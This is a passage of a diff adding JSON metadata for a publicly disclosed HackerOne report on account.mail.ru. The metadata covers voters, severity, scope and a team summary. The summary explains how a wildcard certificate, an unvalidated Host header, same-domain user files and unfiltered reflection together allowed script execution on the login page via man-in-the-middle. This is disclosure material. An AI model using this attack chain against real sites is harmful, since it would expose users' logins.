InCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c88f73da5f3574dcc823b829f9f1803b10d4cfc55f2c37dfd066af4987f3460d",
+      "file_size": 1481165,
+      "type": "video/webm",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-01-26T14:11:31.936Z",
+  "allow_singular_disclosure_after": -190852995.2510396,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "s_p_q_r",
+    "theappsec",
+    "whitesector",
+    "eveeez",
+    "khizer47",
+    "cr4xerbik4sh",
+    "3apa3a",
+    "b42f97eb69dddcafe5cc278"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 258,
+    "asset_type": "URL",
+    "asset_identifier": "account.mail.ru",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 6165,
+      "category": "team",
+      "content": "Due to combination of\n1. Wildcard certificate usage\n2. Unvalidated Host: name in HTTP(s) request\n3. Reusing domain name for hosting of user-controlled files\n4. Unfiltered parameter reflection\n\nIt was possible for attacker who can perform active MitM access between client and server to execute javascript in the context of  https://account.mail.ru/login page.\n",
+      "user": {
+        "id": 4836,
+        "username": "3apa3a",
+        "name": "Vladimir Dubrovin",
+        "bio": "En la agostada senda he visto al buen lagarto (gota de cocodrilo) meditando. ",
+        "cleared": false,
+        "verified": false,
+        "website": "https://3proxy.org/",
+        "location": "Nizhny Novgorod, Russia",
+        "created_at": "2014-04-10T22:08:47.745Z",
+        "url": "https://hackerone.com/3apa3a",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
